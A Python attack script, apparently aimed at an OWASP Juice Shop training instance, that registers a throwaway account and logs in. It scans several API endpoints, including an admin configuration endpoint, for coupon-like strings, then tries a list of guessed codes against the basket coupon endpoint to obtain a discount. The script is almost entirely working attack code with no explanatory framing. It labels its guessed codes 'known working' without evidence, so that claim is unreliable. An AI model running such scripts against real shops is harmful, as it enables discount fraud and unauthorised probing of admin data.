#!/usr/bin/env python3

import requests
import json
import time

base_url = "https://juice5.wonkatech.org"
session = requests.Session()

print("🔍 ULTRATHINK: Comprehensive coupon discovery...")

# Authenticate first
email = f"finder{int(time.time())}@test.com"
password = "Test123456!"

session.post(f"{base_url}/api/Users/", json={
    "email": email,
    "password": password,
    "passwordRepeat": password,
    "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
    "securityAnswer": "test"
})

login_response = session.post(f"{base_url}/rest/user/login", json={
    "email": email, 
    "password": password
})

if login_response.status_code == 200:
    auth_data = login_response.json()
    token = auth_data.get('authentication', {}).get('token')
    session.headers['Authorization'] = f'Bearer {token}'
    
    # Check various endpoints for coupon information
    endpoints_to_check = [
        "/rest/admin/application-configuration",
        "/api/Challenges",
        "/rest/products/search",
        "/api/Cards",
        "/api/Products",
    ]
    
    print("🔍 Checking configuration endpoints...")
    for endpoint in endpoints_to_check:
        try:
            response = session.get(f"{base_url}{endpoint}")
            if response.status_code == 200:
                data = response.json()
                
                # Convert to string and search for potential coupons
                content_str = json.dumps(data)
                
                # Look for patterns
                import re
                patterns = [
                    r'"([A-Z0-9]{6,12})"',
                    r'"(z85[A-Za-z0-9]+)"',  # Base85 encoding
                    r'"([A-F0-9]{6})"',     # Hex codes
                    r'"([A-Z]+\d+[A-Z]*)"', # Letter-number combinations
                ]
                
                found_codes = set()
                for pattern in patterns:
                    matches = re.findall(pattern, content_str)
                    for match in matches:
                        if len(match) >= 6 and not match in ['SEARCH', 'CHALLENGE', 'PRODUCT']:
                            found_codes.add(match)
                
                if found_codes:
                    print(f"📋 Found in {endpoint}: {found_codes}")
                    
        except:
            pass
    
    # Try some known working Juice Shop coupon formats
    print("\n🎯 Testing known Juice Shop patterns...")
    
    # Set up basket properly
    products = session.get(f"{base_url}/rest/products/search").json().get('data', [])
    session.post(f"{base_url}/api/BasketItems/", json={
        "ProductId": products[0]['id'],
        "quantity": 1
    })
    
    user_info = session.get(f"{base_url}/rest/user/whoami").json().get('user', {})
    basket_id = user_info.get('bid', 1)
    
    # Test some common working Juice Shop coupons
    known_working_codes = [
        "pes[Bh",     # Base85 encoded pattern
        "n<Mop4",     # Another Base85 pattern  
        "mNLrPs7D",   # Base64-like pattern
        "69WT5M",     # Shorter hex pattern
        "FREE", "SAVE", "DISCOUNT"  # Simple text codes
    ]
    
    for code in known_working_codes:
        print(f"Testing: {code}")
        response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{code}", json={})
        
        if response.status_code == 200:
            result = response.json()
            discount = result.get('discount', 0)
            
            if discount and discount > 0:
                print(f"🎉 FOUND VALID COUPON: {code} = {discount}% discount!")
                exit(0)
            else:
                print(f"  No discount: {result}")
        else:
            print(f"  Failed: {response.status_code}")

print("❌ Still searching...")
